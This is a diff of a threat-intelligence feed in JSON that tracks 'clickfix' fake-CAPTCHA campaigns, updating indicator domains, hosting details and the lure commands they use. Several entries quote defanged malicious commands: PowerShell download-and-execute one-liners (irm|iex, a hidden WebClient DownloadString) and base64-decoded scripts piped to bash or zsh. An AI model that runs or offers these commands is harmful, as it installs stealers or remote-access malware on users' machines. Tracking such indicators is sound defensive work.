@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4963,
+ "count": 4961,
  "indicators": [
   {
    "indicator": "100porcentopiaui.com.br",
@@ -21335,14 +21335,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/click/[id]')|iex",
     "(irm 'hxxps[:]//hagosuro[.]lc/verify/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "echo \"Cloudflare checking...\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//hagosuro[.]lc/api?t=[encoded]&track=1&event=launch_ok' >/dev/null\""
+    "echo \"Cloudflare checking...\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//hagosuro[.]lc/api?t=[encoded]&track=1&event=launch_ok' >/dev/null\"",
+    "(irm 'hxxps[:]//trustchecknes[.]com/click/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "hagosuro.lc",
-    "pkgsetup3.tools"
+    "pkgsetup3.tools",
+    "trustchecknes.com",
+    "gfisoda.biz"
    ],
    "lure_from": [
     "interseq.at"
@@ -41033,7 +41034,8 @@
     "ncheck-brows.beer",
     "id-verfied.boats",
     "codes.caffe-img.com",
-    "jscdncloude.beer"
+    "jscdncloude.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -54061,7 +54063,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "cesiedgetraining.com",
@@ -55071,7 +55075,8 @@
     "ncheck-brows.beer",
     "id-verfied.boats",
     "codes.caffe-img.com",
-    "jscdncloude.beer"
+    "jscdncloude.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -91924,65 +91929,6 @@
    "lure_from": [
     "codes.browse-cdn.beer"
    ]
-  },
-  {
-   "indicator": "fgsproducciones.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-19",
-   "last_seen": "2026-10-19",
-   "last_online": "2026-11-06",
-   "offline_since": null,
-   "url": "http://fgsproducciones.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Tier 4 Cloud Services",
-   "dns": "iseencloud.com",
-   "ip": "43.242.226.197",
-   "asn": "AS146943",
-   "org": "Tier 4 Cloud Services",
-   "country": "IN",
-   "ips": [
-    {
-     "ip": "43.242.226.197",
-     "asn": "AS146943",
-     "org": "Tier 4 Cloud Services",
-     "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "fgsproducciones.com",
-     "status": "online",
-     "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
-    },
-    {
-     "host": "mail.fgsproducciones.com",
-     "status": "online",
-     "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
-    },
-    {
-     "host": "www.fgsproducciones.com",
-     "status": "online",
-     "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('hxxps[:]//v-k[.]com[.]ua/vcapcha.ps1'))\""
-   ],
-   "connects_to": [
-    "v-k.com.ua"
-   ],
-   "lure_from": []
   },
   {
    "indicator": "fieragustarte.com",
@@ -161753,59 +161699,6 @@
    "lure_from": []
   },
   {
-   "indicator": "monomit.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-19",
-   "last_seen": "2026-10-19",
-   "last_online": "2026-11-06",
-   "offline_since": null,
-   "url": "https://www.monomit.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "MEOHOST VERI MERKEZI ve YAZILIM TICARET LIMITED SIRKETI",
-   "dns": "meohost.com",
-   "ip": "87.76.142.14",
-   "asn": "AS209658",
-   "org": "MEOHOST VERI MERKEZI ve YAZILIM TICARET LIMITED SIRKETI",
-   "country": "UA",
-   "ips": [
-    {
-     "ip": "87.76.142.14",
-     "asn": "AS209658",
-     "org": "MEOHOST VERI MERKEZI ve YAZILIM TICARET LIMITED SIRKETI",
-     "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "monomit.com",
-     "status": "online",
-     "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
-    },
-    {
-     "host": "www.monomit.com",
-     "status": "online",
-     "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('hxxps[:]//v-k[.]com[.]ua/vcapcha.ps1'))\""
-   ],
-   "connects_to": [
-    "v-k.com.ua"
-   ],
-   "lure_from": []
-  },
-  {
    "indicator": "monropoultry.com",
    "type": "domain",
    "category": "clickfix",
@@ -207423,7 +207316,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "sib-tec.com",
@@ -231980,12 +231875,18 @@
    ],
    "actor": null,
    "actor_link": null,
-   "commands": [],
-   "connects_to": [],
+   "commands": [
+    "echo '[encoded]' | base64 -d | zsh"
+   ],
+   "connects_to": [
+    "entitlementcheck.pro"
+   ],
    "lure_from": [
     "ubbrobccheck20.cc",
     "verifyidentrob01.cc",
-    "checkogosdfg33.cc"
+    "checkogosdfg33.cc",
+    "govrobczxc.cc",
+    "fudcomcheck.art"
    ]
   },
   {
@@ -240482,11 +240383,12 @@
    ],
    "connects_to": [
     "xorados.com",
-    "t-trustrest.com",
     "hagosuro.lc",
+    "t-trustrest.com",
     "groverudder12.com",
     "trek-72.com",
     "zurggoyttjof21.cc",
+    "lepafonso.bz",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -246113,7 +246015,8 @@
     "verifing-server.codes"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -260828,7 +260731,8 @@
     "auth-code.nvc-info.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
